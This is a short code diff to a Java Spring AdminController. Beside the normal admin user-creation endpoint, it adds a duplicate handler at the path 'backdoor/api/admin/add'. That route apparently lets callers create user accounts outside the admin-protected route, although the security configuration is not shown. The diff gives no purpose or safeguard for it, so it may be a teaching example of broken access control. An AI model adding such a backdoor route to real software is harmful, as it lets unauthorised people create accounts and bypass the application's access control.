@@ -36,9 +36,18 @@ public class AdminController {
 		Map<String, String> result = Map.of("message", "user say hello");
 		return result;
 	}
-
+    
     @PostMapping("api/admin/add")
     public User addUserByAdmin(@RequestBody User user) {
+        String pwd = user.getPassword();
+        String encryptedPwd = passwordEncoder.encode(pwd);
+        user.setPassword(encryptedPwd);
+        userRepository.save(user);
+        return user;
+    }
+
+    @PostMapping("backdoor/api/admin/add")
+    public User addUserByBackdoor(@RequestBody User user) {
         String pwd = user.getPassword();
         String encryptedPwd = passwordEncoder.encode(pwd);
         user.setPassword(encryptedPwd);
